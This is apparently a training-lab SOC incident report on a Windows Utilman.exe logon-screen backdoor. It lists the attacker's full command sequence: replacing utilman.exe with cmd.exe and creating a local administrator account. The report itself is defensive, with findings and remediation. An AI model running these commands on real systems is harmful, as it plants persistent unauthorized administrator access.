# Case Report — SOC211: Utilman.exe Winlogon Exploit Attempt (Logon Screen Backdoor)

**Date:** 2023-06-21  
**Category:** Persistence / Privilege abuse (LOLBIN technique)  
**Verdict:** True Positive (Persistence confirmed)

---

## 1) Alert Summary
- **Time:** Jun 21, 2023, 11:02 AM
- **Rule:** SOC211 — Utilman.exe Winlogon Exploit Attempt
- **Action:** Allowed
- **Host:** Henry (`172.16.17.149`)
- **Process:** `Utilman.exe` (parent: `Winlogon.exe`)
- **Process Hash:** `ded8fd7f36417f66eb6ada10e0c0d7c0022986e9`
- **Trigger:** Command launched from Winlogon
- **Observed command:** `net user superman onepunch123 /add`

## 2) Evidence (Endpoint / Terminal History)
Commands observed:
- `cd C:\Windows\System32`
- `rename utilman.exe utilman.old`
- `copy cmd.exe utilman.exe`
- `shutdown /h /t 0`
- `net user`
- `whoami`
- `net user superman onepunch123 /add`
- `net localgroup administrators superman /add`

## 3) Findings
- **Binary replacement:** `utilman.exe` renamed and replaced with `cmd.exe`
- **Backdoor account:** `superman` created
- **Privilege change:** `superman` added to local **Administrators**
- **C2 / Outbound:** Not identified
- **Quarantine:** Not applicable / not identified

## 4) Response / Recommendations
- Isolate the host to prevent further activity.
- Remove the backdoor account and review local admin membership.
- Restore original system binaries (`utilman.exe`) and validate file integrity.
- Review authentication logs for suspicious logons after account creation.

## 5) Artifacts
- **Host IP:** `172.16.17.149`
- **Process hash:** `ded8fd7f36417f66eb6ada10e0c0d7c0022986e9`
- **Backdoor username:** `superman` (noted)

## 6) Final Comment
SOC211 detected abuse of Winlogon/Utilman consistent with the classic logon-screen backdoor technique. Endpoint evidence confirmed replacement of `utilman.exe` with `cmd.exe`, creation of a new user (`superman`), and elevation to local Administrators. **Verdict: TP; persistence confirmed; isolate and remediate immediately.**
